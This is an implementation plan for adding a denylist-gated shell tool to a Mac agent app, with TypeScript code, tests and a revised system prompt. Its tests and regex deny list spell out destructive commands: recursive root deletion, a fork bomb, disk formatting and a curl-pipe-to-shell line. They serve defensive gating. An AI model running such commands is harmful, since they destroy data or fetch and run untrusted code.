# Shell Tool (P1) Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Add a built-in `shell.run_shell` tool that runs commands via `/bin/sh -c`, gated by a denylist that escalates catastrophic commands to the permission prompt while everything else auto-runs; plus a system-prompt update so the agent prefers shell over screen-capture for filesystem/info queries.

**Architecture:** Extend the P0 registry with optional per-call dynamic risk (`ToolSpec.riskFor`), so `beforeToolCall` can prompt only for dangerous shell commands. The shell tool mirrors `peekaboo.ts`'s `child_process.spawn` pattern. Registration goes through `builtins.ts`; the default agent's system prompt is updated to steer tool selection.

**Tech Stack:** TypeScript, `@earendil-works/pi-agent-core` (`AgentTool`), `@earendil-works/pi-ai` (`Type`), `node:child_process`/`node:os`, Vitest (`pnpm test`, runs under Electron).

**Spec:** `docs/superpowers/specs/2026-06-02-shell-tool-design.md`

## File Structure

| File | Responsibility |
|---|---|
| `src/service/tools/registry.ts` *(modify)* | Add `ToolSpec.riskFor`; `resolve` returns `riskOf(name, args?)` using `riskFor` when present |
| `src/service/agent-runner.ts` *(modify)* | `beforeToolCall` passes `args` to `riskOf`; update the `let riskOf` type |
| `src/service/tools/registry.test.ts` *(modify)* | Test dynamic-risk override |
| `src/service/tools/shell.ts` *(create)* | `shellSpec()` + `isDangerousCommand()` |
| `src/service/tools/shell.test.ts` *(create)* | Shell execution + denylist tests |
| `src/service/tools/builtins.ts` *(modify)* | Register `shellSpec()` |
| `src/service/tools/builtins.test.ts` *(modify)* | Assert shell registered + dynamic risk via registry |
| `src/main/agents/registry.ts` *(modify)* | Update `DEFAULT_SYSTEM_PROMPT` tool list + selection guidance |

---

## Task 1: Registry per-call dynamic risk

**Files:**
- Modify: `src/service/tools/registry.ts`
- Modify: `src/service/agent-runner.ts`
- Test: `src/service/tools/registry.test.ts`

- [ ] **Step 1: Add the failing test**

In `src/service/tools/registry.test.ts`, add this test inside the `describe('ToolRegistry', ...)` block (after the existing `riskOf` test):

```ts
  it('riskFor overrides static risk per call; specs without it use static risk', () => {
    const r = createToolRegistry()
    r.register({
      group: 'shell',
      name: 'run_shell',
      risk: 'low',
      riskFor: (a) => ((a as { command?: string }).command === 'danger' ? 'high' : 'low'),
      source: 'builtin',
      build: () => fakeTool('run_shell'),
    })
    r.register(spec('peekaboo', 'see_screen', 'low'))
    const { riskOf } = r.resolve(['*'], ctx)
    expect(riskOf('run_shell', { command: 'danger' })).toBe('high')
    expect(riskOf('run_shell', { command: 'safe' })).toBe('low')
    expect(riskOf('see_screen')).toBe('low') // static, no args
    expect(riskOf('unknown', {})).toBe('medium')
  })
```

- [ ] **Step 2: Run test to verify it fails**

Run: `pnpm test src/service/tools/registry.test.ts`
Expected: FAIL — TypeScript rejects `riskFor` (not on `ToolSpec`) and/or `riskOf` called with 2 args.

- [ ] **Step 3: Modify `registry.ts`**

3a. In `ToolSpec`, add `riskFor` right after the `risk` line:

```ts
  risk: ToolRisk
  /** Optional per-call risk override. When present, overrides `risk` for the gate decision based on the tool's arguments. */
  riskFor?: (args: unknown) => ToolRisk
```

3b. In the `ToolRegistry` interface, change the `resolve` return signature:

```ts
  resolve(
    allowlist: string[],
    ctx: ToolRunContext,
  ): { tools: AgentTool[]; riskOf: (name: string, args?: unknown) => ToolRisk }
```

3c. Replace the body of `resolve` (the `riskByName`/`riskOf` lines) with:

```ts
    resolve(allowlist, ctx) {
      const selected = specs.filter((s) => specMatches(s, allowlist))
      const tools = selected.map((s) => s.build(ctx))
      const specByName = new Map(selected.map((s) => [s.name, s] as const))
      // unknown -> medium (fail safe); riskFor overrides static risk per call.
      const riskOf = (name: string, args?: unknown): ToolRisk => {
        const spec = specByName.get(name)
        if (!spec) return 'medium'
        return spec.riskFor ? spec.riskFor(args) : spec.risk
      }
      return { tools, riskOf }
    },
```

- [ ] **Step 4: Modify `agent-runner.ts`**

4a. Update the `let riskOf` declaration (currently `let riskOf: (name: string) => ToolRisk`):

```ts
      let riskOf: (name: string, args?: unknown) => ToolRisk
```

4b. In `beforeToolCall`, pass `args` (currently `const risk = riskOf(toolCall.name)`):

```ts
          const risk = riskOf(toolCall.name, args)
```

- [ ] **Step 5: Run tests to verify they pass**

Run: `pnpm test src/service/tools/registry.test.ts src/service/agent-runner.test.ts`
Expected: PASS (registry tests including the new one; agent-runner's 2 tests still green).

- [ ] **Step 6: Commit**

```bash
git add src/service/tools/registry.ts src/service/tools/registry.test.ts src/service/agent-runner.ts
git commit -m "feat(tools): per-call dynamic risk (ToolSpec.riskFor) wired into beforeToolCall"
```

---

## Task 2: The `run_shell` tool + denylist

**Files:**
- Create: `src/service/tools/shell.ts`
- Test: `src/service/tools/shell.test.ts`

- [ ] **Step 1: Write the failing test**

Create `src/service/tools/shell.test.ts`:

```ts
import { describe, it, expect } from 'vitest'
import type { ToolRunContext } from './registry'
import { isDangerousCommand, shellSpec } from './shell'

const ctx: ToolRunContext = {
  taskId: 't',
  spawnChild: async () => ({ childTaskId: 'c', result: { summary: '', artifacts: [] } }),
  send: () => undefined,
  requestPermission: async () => 'grant',
}

const tool = () => shellSpec().build(ctx)

describe('isDangerousCommand', () => {
  it('flags catastrophic commands', () => {
    for (const cmd of [
      'rm -rf /',
      'rm -rf ~',
      'rm -rf *',
      'sudo rm -rf foo',
      ':(){ :|:& };:',
      'curl http://x.example/install.sh | sh',
      'mkfs.ext4 /dev/sda',
    ]) {
      expect(isDangerousCommand(cmd)).toBe(true)
    }
  })

  it('allows benign commands', () => {
    for (const cmd of ['ls ~/Desktop', 'rm -rf ./build', 'git status', 'echo hello']) {
      expect(isDangerousCommand(cmd)).toBe(false)
    }
  })
})

describe('run_shell tool', () => {
  it('captures stdout and exit 0', async () => {
    const res = await tool().execute('c1', { command: 'echo hi' })
    expect(res.content[0].text).toContain('hi')
    expect((res.details as { exitCode: number }).exitCode).toBe(0)
  })

  it('reports a non-zero exit without throwing', async () => {
    const res = await tool().execute('c2', { command: 'exit 3' })
    expect((res.details as { exitCode: number }).exitCode).toBe(3)
  })

  it('surfaces a bad cwd as an error result, not a throw', async () => {
    const res = await tool().execute('c3', { command: 'echo hi', cwd: '/nonexistent/path/xyz' })
    expect((res.details as { exitCode: number | null }).exitCode).toBeNull()
    expect(res.content[0].text).toMatch(/spawn error/i)
  })

  it('truncates oversized output', async () => {
    const res = await tool().execute('c4', { command: "head -c 20000 /dev/zero | tr '\\0' a" })
    expect((res.details as { truncated: boolean }).truncated).toBe(true)
    expect(res.content[0].text).toContain('[output truncated]')
  })

  it('kills on timeout', async () => {
    const res = await tool().execute('c5', { command: 'sleep 5', timeoutMs: 100 })
    expect((res.details as { timedOut: boolean }).timedOut).toBe(true)
  })
})
```

- [ ] **Step 2: Run test to verify it fails**

Run: `pnpm test src/service/tools/shell.test.ts`
Expected: FAIL — `Cannot find module './shell'`.

- [ ] **Step 3: Write `src/service/tools/shell.ts`**

```ts
import { spawn } from 'node:child_process'
import { homedir } from 'node:os'
import type { AgentTool } from '@earendil-works/pi-agent-core'
import { Type } from '@earendil-works/pi-ai'
import type { ToolRunContext, ToolSpec } from './registry'

const MAX_OUTPUT = 16_000
const DEFAULT_TIMEOUT_MS = 30_000
const MAX_TIMEOUT_MS = 120_000

// Catastrophic-destruction patterns. NOT a security boundary — trivially
// bypassable; it exists to catch obvious disasters and escalate them to the
// permission prompt (the prompt is the real protection).
function isDangerousRm(cmd: string): boolean {
  if (!/\brm\b/i.test(cmd)) return false
  const recursive = /-\w*r/i.test(cmd)
  const force = /-\w*f/i.test(cmd)
  // a whitespace-preceded token that begins with '/', '~', or is '*'
  const dangerTarget = /\s(\/\S*|~\S*|\*)(\s|$)/.test(cmd)
  return recursive && force && dangerTarget
}

const DANGEROUS_PATTERNS: RegExp[] = [
  /--no-preserve-root/i,
  /:\s*\(\s*\)\s*\{\s*:\s*\|\s*:\s*&?\s*\}\s*;\s*:/, // fork bomb :(){ :|:& };:
  /\bmkfs\b/i,
  /\bdd\b[^\n]*\bof=\/dev\//i,
  />\s*\/dev\/(sd|disk|nvme|hd)\w*/i,
  /\b(curl|wget)\b[^\n|]*\|\s*(sudo\s+)?(sh|bash|zsh|dash)\b/i, // pipe to shell
  /\bsudo\b/i,
  /\bchmod\b\s+(-R\s+)?0?777\s+\//i,
]

export function isDangerousCommand(command: string): boolean {
  return isDangerousRm(command) || DANGEROUS_PATTERNS.some((re) => re.test(command))
}

type ShellResult = { stdout: string; stderr: string; code: number | null; timedOut: boolean; spawnError?: string }

function runShell(command: string, cwd: string, timeoutMs: number): Promise<ShellResult> {
  return new Promise((resolve) => {
    const proc = spawn('/bin/sh', ['-c', command], { cwd, env: process.env })
    let stdout = ''
    let stderr = ''
    let timedOut = false
    const timer = setTimeout(() => {
      timedOut = true
      proc.kill('SIGKILL')
    }, timeoutMs)
    proc.stdout.on('data', (b: Buffer) => {
      stdout += b.toString('utf8')
    })
    proc.stderr.on('data', (b: Buffer) => {
      stderr += b.toString('utf8')
    })
    proc.on('error', (err) => {
      clearTimeout(timer)
      resolve({ stdout, stderr, code: null, timedOut, spawnError: err.message })
    })
    proc.on('close', (code) => {
      clearTimeout(timer)
      resolve({ stdout, stderr, code, timedOut })
    })
  })
}

const ShellParams = Type.Object({
  command: Type.String({ description: 'The shell command to run via /bin/sh -c.' }),
  cwd: Type.Optional(Type.String({ description: 'Working directory. Defaults to the user home directory.' })),
  timeoutMs: Type.Optional(Type.Number({ description: 'Timeout in milliseconds (default 30000, max 120000).' })),
})

export function shellSpec(): ToolSpec {
  return {
    group: 'shell',
    name: 'run_shell',
    risk: 'low',
    riskFor: (args) => (isDangerousCommand((args as { command?: string }).command ?? '') ? 'high' : 'low'),
    source: 'builtin',
    build: (_ctx: ToolRunContext): AgentTool => ({
      name: 'run_shell',
      label: 'Run shell command',
      description:
        'Run a shell command via /bin/sh -c and return its combined stdout/stderr and exit code. Use for filesystem, system, and information queries (e.g. `ls ~/Desktop`, `cat file`, `git status`).',
      parameters: ShellParams,
      execute: async (_toolCallId: string, params: unknown) => {
        const p = params as { command: string; cwd?: string; timeoutMs?: number }
        const cwd = p.cwd ?? homedir()
        const timeoutMs = Math.min(p.timeoutMs ?? DEFAULT_TIMEOUT_MS, MAX_TIMEOUT_MS)
        const r = await runShell(p.command, cwd, timeoutMs)

        const combined = r.stdout + (r.stderr ? `${r.stdout ? '\n' : ''}${r.stderr}` : '')
        const truncated = combined.length > MAX_OUTPUT
        const body = truncated ? `${combined.slice(0, MAX_OUTPUT)}\n…[output truncated]` : combined
        const statusLine = r.spawnError
          ? `[spawn error: ${r.spawnError}]`
          : r.timedOut
            ? `[timed out after ${timeoutMs}ms]`
            : `[exit ${r.code}]`
        const text = `$ ${p.command}   (cwd: ${cwd})\n${statusLine}\n${body}`.trimEnd()
        return {
          content: [{ type: 'text', text }],
          details: { exitCode: r.code, timedOut: r.timedOut, cwd, truncated },
        }
      },
    }),
  }
}
```

- [ ] **Step 4: Run test to verify it passes**

Run: `pnpm test src/service/tools/shell.test.ts`
Expected: PASS (7 tests). If the truncation test's `head -c 20000 /dev/zero | tr '\0' a` behaves oddly on the runner, an equivalent that also works under `/bin/sh` is `yes a | head -c 20000` — but try the `/dev/zero` form first.

- [ ] **Step 5: Commit**

```bash
git add src/service/tools/shell.ts src/service/tools/shell.test.ts
git commit -m "feat(tools): run_shell tool with denylist-escalates-to-prompt risk"
```

---

## Task 3: Register the shell tool

**Files:**
- Modify: `src/service/tools/builtins.ts`
- Test: `src/service/tools/builtins.test.ts`

- [ ] **Step 1: Update the test first**

In `src/service/tools/builtins.test.ts`:

1a. Update the existing exact-list assertion (currently expects `['agent.spawn_sub_agent', 'peekaboo.list_apps', 'peekaboo.see_screen']`) to include shell:

```ts
    expect(ids).toEqual([
      'agent.spawn_sub_agent',
      'peekaboo.list_apps',
      'peekaboo.see_screen',
      'shell.run_shell',
    ])
```

1b. Add a new test in the `describe('registerBuiltinTools', ...)` block:

```ts
  it('resolves the shell tool and gates dangerous commands dynamically', () => {
    const { tools, riskOf } = make().resolve(['shell.*'], ctx)
    expect(tools.map((t) => t.name)).toEqual(['run_shell'])
    expect(riskOf('run_shell', { command: 'rm -rf /' })).toBe('high')
    expect(riskOf('run_shell', { command: 'ls ~/Desktop' })).toBe('low')
  })
```

- [ ] **Step 2: Run test to verify it fails**

Run: `pnpm test src/service/tools/builtins.test.ts`
Expected: FAIL — list assertion missing `shell.run_shell`; `resolve(['shell.*'])` returns no tools.

- [ ] **Step 3: Register the shell spec in `builtins.ts`**

3a. Add the import alongside the others:

```ts
import { shellSpec } from './shell'
```

3b. Register it in `registerBuiltinTools` (after the spawn registration):

```ts
export function registerBuiltinTools(registry: ToolRegistry): void {
  for (const spec of peekabooSpecs()) registry.register(spec)
  registry.register(spawnAgentSpec())
  registry.register(shellSpec())
}
```

- [ ] **Step 4: Run test to verify it passes**

Run: `pnpm test src/service/tools/builtins.test.ts`
Expected: PASS (existing tests + the new one).

- [ ] **Step 5: Commit**

```bash
git add src/service/tools/builtins.ts src/service/tools/builtins.test.ts
git commit -m "feat(tools): register run_shell in the builtin tool set"
```

---

## Task 4: System-prompt update (prefer shell over screen-capture)

**Files:**
- Modify: `src/main/agents/registry.ts`

- [ ] **Step 1: Check the agents registry test for prompt assertions**

Run: `pnpm test src/main/agents/registry.test.ts`
Expected: PASS currently. Read the test; if it asserts the *exact* `DEFAULT_SYSTEM_PROMPT` string, you'll update that expectation in Step 3. (It most likely asserts ids/toolScope/maxIterations, not prompt prose.)

- [ ] **Step 2: Replace `DEFAULT_SYSTEM_PROMPT`**

In `src/main/agents/registry.ts`, replace the `DEFAULT_SYSTEM_PROMPT` constant with:

```ts
const DEFAULT_SYSTEM_PROMPT = `You are SwarmAgents, an autonomous worker agent operating a user's Mac.

You have these tools:
  - run_shell({command, cwd?, timeoutMs?}): run a shell command via /bin/sh -c; returns combined stdout/stderr and the exit code.
  - see_screen({mode}): capture the screen and get a list of UI elements with Peekaboo IDs.
  - list_apps(): enumerate running apps and their windows.

Choosing a tool:
  - Filesystem, system state, or information queries → run_shell (e.g. \`ls ~/Desktop\`, \`cat file\`, \`git status\`). It is faster and more accurate than reading the screen.
  - see_screen / list_apps → ONLY when you must interact with or read what is currently on screen.

Workflow:
  1. Read the goal carefully and pick the right tool per the guidance above.
  2. Think out loud briefly between tool calls.
  3. Write a one-paragraph summary at the end. Do not loop indefinitely.
  4. If a tool returns an error (e.g. permission denied), explain it in the summary instead of retrying blindly.`
```

(Leave `RESEARCHER_SYSTEM_PROMPT` and `EXECUTOR_SYSTEM_PROMPT` unchanged — the researcher's `toolScope: 'peekaboo'` does not resolve `shell.*`, so shell guidance there would be misleading.)

- [ ] **Step 3: If the registry test asserted exact prompt text, update it**

If Step 1 showed an exact-string assertion on `DEFAULT_SYSTEM_PROMPT`, update that expected string to match the new prompt. Otherwise no test change.

- [ ] **Step 4: Verify the whole project**

Run: `pnpm run verify`
Expected: PASS — typecheck + lint + full vitest suite + native-feel check all green.

- [ ] **Step 5: Commit**

```bash
git add src/main/agents/registry.ts
git commit -m "feat(agents): default prompt prefers run_shell for filesystem/info, peekaboo for on-screen UI"
```

---

## Done criteria

- `ToolSpec.riskFor` exists; `beforeToolCall` calls `riskOf(toolCall.name, args)`; a denylisted command resolves to `'high'` and triggers the permission prompt, while normal commands stay `'low'` (auto-run).
- `run_shell` runs via `/bin/sh -c`, captures stdout/stderr/exit code, defaults `cwd` to `$HOME`, clamps timeout to 120 s, truncates output at 16 000 chars, and reports (never throws) on non-zero exit / bad cwd / timeout.
- `isDangerousCommand` flags root/home/wildcard `rm -rf`, fork bombs, `mkfs`/`dd of=/dev`, pipe-to-shell, `sudo`, `chmod 777 /`; ignores `rm -rf ./build`, `ls`, `git status`.
- `registerBuiltinTools` includes `shell.run_shell`.
- The default agent's system prompt lists `run_shell` and routes filesystem/info queries to it (fixing "what files are on the desktop" → `ls ~/Desktop`, not a screenshot).
- `pnpm run verify` is green.
